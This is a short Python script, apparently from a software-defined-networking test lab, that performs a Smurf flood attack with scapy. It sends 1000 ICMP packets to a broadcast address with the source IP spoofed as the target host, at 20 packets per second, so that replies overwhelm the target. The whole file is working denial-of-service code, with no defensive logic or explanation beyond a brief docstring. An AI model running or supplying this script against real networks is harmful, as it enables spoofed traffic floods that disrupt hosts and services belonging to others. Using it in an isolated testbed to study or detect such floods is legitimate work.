#   python -E Smurf.py broadcast_address target_ip
"""
Smurf flooding attack to target host IP address with IP-spoofing.
This attack might not be harmful to controller, switch, but hosts within the network.
Send 1000 packets with the rate of 20 packets per second.
"""
import sys
import time
from os import popen
from scapy.all import sendp, IP, Ether, ICMP
import random
import string
from random import randint


def main():
    broadcast_addr = sys.argv[1]
    target_addr = sys.argv[2]
    print (broadcast_addr)
    print (target_addr)

    interface = popen('ip link show | grep "eth0:" | awk \'{print $2}\' | tr -d ":"').read()
    if not interface.strip():
        interface = popen('ifconfig | grep "eth0" | awk \'{print $1}\'').read()
    print (repr(interface))

    payload = ""

    for i in range(1000):
        payload = "".join(random.choice(string.ascii_uppercase + string.digits +
                          string.ascii_lowercase) for x in range(randint(10, 40)))
        
        packets = Ether()/IP(dst=broadcast_addr, src=target_addr)/ICMP() / payload
        print(repr(packets))

        sendp(packets, iface=interface.rstrip(), inter=0.05)


if __name__ == "__main__":
    main()
